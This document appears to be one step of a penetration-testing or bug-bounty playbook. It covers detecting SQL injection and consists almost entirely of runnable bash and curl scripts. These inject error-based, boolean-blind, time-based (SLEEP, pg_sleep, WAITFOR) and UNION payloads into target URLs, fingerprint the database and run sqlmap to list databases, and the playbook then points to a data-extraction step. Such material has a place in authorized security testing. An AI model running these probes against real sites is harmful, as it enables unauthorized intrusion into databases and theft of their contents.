# SQL Injection — Probe

## Purpose
Inject SQL detection payloads into every discovered injection point. Identify error-based, boolean blind, time-based blind, and UNION injection surfaces. Database fingerprinting on first contact.

## Required Variables
- `$TARGET_URL` — target endpoint with injectable param
- `$OUTDIR` — output root
- `$TARGETS_FILE` — file with candidate URLs (`$OUTDIR/sqli/high_value_targets.txt`)

## Commands

### P1 — Single Character Injection (Universal Probes)

```bash
export PATH="/opt/homebrew/bin:$HOME/go/bin:$HOME/Library/Python/3.14/bin:$PATH"

# Inject single quote into every candidate and check for DB errors
while read -r url; do
  test_url="${url}'"
  resp=$(curl -s -o - -w '%{http_code}' "$test_url" 2>/dev/null)
  echo "$resp" | rg -iq 'error|exception|warning|syntax|sql|mysql|postgresql|oracle|odbc|driver|traceback|stack|ORA-\d+|unclosed|malformed' && \
    echo "[!] ERROR: $url" | tee -a "$OUTDIR/sqli/error_hits.txt"
done < "$TARGETS_FILE"

# Double-quote and backslash probes
while read -r url; do
  curl -s "${url}\"" 2>/dev/null | rg -iq 'error|syntax|sql' && echo "[!][\"] $url" >> "$OUTDIR/sqli/error_hits_all.txt"
  curl -s "${url}\\" 2>/dev/null | rg -iq 'error|syntax|sql' && echo "[!][\\] $url" >> "$OUTDIR/sqli/error_hits_all.txt"
  curl -s "${url})" 2>/dev/null | rg -iq 'error|syntax|sql' && echo "[!][)] $url" >> "$OUTDIR/sqli/error_hits_all.txt"
done < "$TARGETS_FILE"
```

### P2 — Logic-Based Differential (Boolean Blind Detection)

```bash
# Test a single target with true/false conditions
# Replace the last param value with ' OR '1'='1
BASE=$(curl -s "$TARGET_URL" | wc -c)
TRUE=$(curl -s "${TARGET_URL}' OR '1'='1" | wc -c)
FALSE=$(curl -s "${TARGET_URL}' AND '1'='2" | wc -c)

echo "Baseline: ${BASE}b | True: ${TRUE}b | False: ${FALSE}b"

if [ "$TRUE" != "$FALSE" ]; then
  echo "[!] Boolean blind differential confirmed — SQLi present!" | tee -a "$OUTDIR/sqli/boolean_hits.txt"
elif [ "$TRUE" -gt 0 ] && [ "$FALSE" -eq 0 ]; then
  echo "[!] FALSE condition returns empty — Boolean blind confirmed!" | tee -a "$OUTDIR/sqli/boolean_hits.txt"
fi
```

### P3 — Time-Based Blind Detection

```bash
# MySQL SLEEP probe
TIME_BASE=$(curl -s -o /dev/null -w '%{time_total}' "$TARGET_URL")
TIME_MYSQL=$(curl -s -o /dev/null -w '%{time_total}' "${TARGET_URL}' OR SLEEP(5)-- -")
echo "MySQL sleep: $TIME_MYSQL s (baseline $TIME_BASE s)"

# PostgreSQL pg_sleep
TIME_PG=$(curl -s -o /dev/null -w '%{time_total}' "${TARGET_URL}' OR pg_sleep(5)--")
echo "PostgreSQL sleep: $TIME_PG s"

# MSSQL WAITFOR DELAY
TIME_MSSQL=$(curl -s -o /dev/null -w '%{time_total}' "${TARGET_URL}'; WAITFOR DELAY '00:00:05'--")
echo "MSSQL delay: $TIME_MSSQL s"

# Oracle DBMS_LOCK
TIME_ORA=$(curl -s -o /dev/null -w '%{time_total}' "${TARGET_URL}' OR DBMS_LOCK.SLEEP(5)--")
echo "Oracle sleep: $TIME_ORA s"

# Flag any > 4s deviation
for label in "MySQL:$TIME_MYSQL" "PG:$TIME_PG" "MSSQL:$TIME_MSSQL" "Oracle:$TIME_ORA"; do
  IFS=':' read -r db t <<< "$label"
  (( $(echo "$t > $TIME_BASE + 4" | bc -l) )) && echo "[!] Time-based confirmed: $db (${t}s)" | tee -a "$OUTDIR/sqli/time_hits.txt"
done
```

### P4 — UNION Probe (Column Count)

```bash
# ORDER BY enumeration to find column count
for i in $(seq 1 30); do
  code=$(curl -s -o /dev/null -w '%{http_code}' "${TARGET_URL}' ORDER BY $i-- -")
  [ "$code" != "200" ] && echo "ORDER BY $i = $code (columns < $i)" | tee -a "$OUTDIR/sqli/union_orderby.txt" && break
done

# UNION SELECT NULL enumeration
for i in $(seq 1 30); do
  nulls=$(python3 -c "print(','.join(['NULL']*$i))")
  enc="' UNION SELECT ${nulls}-- -"
  enc_url=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${enc}'))")
  code=$(curl -s -o /dev/null -w '%{http_code}' "${TARGET_URL}${enc_url}")
  [ "$code" = "200" ] && echo "UNION NULL($i) = 200" | tee -a "$OUTDIR/sqli/union_columns.txt" && break
done
```

### P5 — Database Fingerprint from Error Messages

```bash
ERROR=$(curl -s "${TARGET_URL}'" 2>/dev/null)

if echo "$ERROR" | rg -q "You have an error in your SQL syntax|MySQL|MariaDB|mysqli"; then
  DB="MySQL"
elif echo "$ERROR" | rg -q "ERROR:|syntax error at or near|PSQLException|PG::"; then
  DB="PostgreSQL"
elif echo "$ERROR" | rg -q "Microsoft OLE DB|SQL Server|Incorrect syntax|Unclosed quotation"; then
  DB="MSSQL"
elif echo "$ERROR" | rg -q "ORA-\d+|Oracle|quoted string not properly terminated|PLS-"; then
  DB="Oracle"
elif echo "$ERROR" | rg -q "SQLite|SQLITE_ERROR|near.*syntax error"; then
  DB="SQLite"
else
  DB="Unknown"
fi
echo "[DB] $DB" | tee -a "$OUTDIR/sqli/db_fingerprint.txt"
```

### P6 — sqlmap Quick Scan

```bash
sqlmap -u "$TARGET_URL" --batch --level=3 --risk=2 --dbs --technique=BEUST -o "$OUTDIR/sqli/sqlmap_quick/" 2>&1 | tee "$OUTDIR/sqli/sqlmap_quick_output.txt"
```

## Detection Signals
- Error response contains `SQL syntax`, `ORA-`, `PSQLException`, `Unclosed quotation` → error-based SQLi confirmed
- Response size differs > 50 bytes between TRUE/FALSE conditions → boolean blind confirmed
- Response time > baseline + 4 seconds → time-based blind confirmed
- `ORDER BY n` breaks at known column limit → UNION injection possible
- sqlmap output contains `[INFO] the back-end DBMS is` → automated confirmation

## False Positives
- Application-level error messages unrelated to SQL (e.g. validation errors) — filter: `grep -vE 'validation|required|must be|invalid format|too long|too short'`
- Slow network causing false time-based detection — verify with multiple baselines; >2x baseline confirms
- ORDER BY breaking due to app routing not SQL error — verify the error message is SQL-specific

## Next
├── If error-based confirmed → go to `03-verify.md` for error-based data extraction
├── If boolean blind confirmed → go to `03-verify.md` for blind data extraction
├── If time-based confirmed → go to `03-verify.md` with time-based extraction
├── If UNION columns found → go to `03-verify.md` for UNION data extraction
├── If all probes negative → increase level/risk and re-run; test POST/cookie/header vectors
└── Always → save `db_fingerprint.txt` and technique hits before proceeding